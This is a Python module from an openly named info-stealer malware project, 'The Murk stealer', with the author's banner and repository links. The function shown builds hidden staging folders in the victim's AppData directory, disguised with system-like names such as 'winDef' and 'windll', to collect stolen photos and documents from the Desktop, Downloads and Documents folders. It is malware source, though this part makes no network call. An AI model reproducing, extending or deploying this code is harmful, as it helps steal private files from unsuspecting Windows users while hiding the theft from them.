#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
"""
All imports
"""
from os import environ, sep, makedirs
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes


"""
Makes all needed directories
"""
def Folders(fileGrab,startOne):
    pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
    if startOne:
        try:
            makedirs(rf'{pathf}\system\sysFiles\winDef')
        except:
            pass
        try:
            f = open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
            f.close()
        except:
            pass
    try:
        makedirs(rf'{pathf}\windll\System')
        SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
    except:
        pass
    try:
        makedirs(rf'{pathf}\windll\Photos')
    except:
        pass
    if not fileGrab:
        makedirs(rf'{pathf}\windll\Files\DocumentFiles\Desktop')
        makedirs(rf'{pathf}\windll\Files\DocumentFiles\Downloads')
        makedirs(rf'{pathf}\windll\Files\DocumentFiles\Documents')

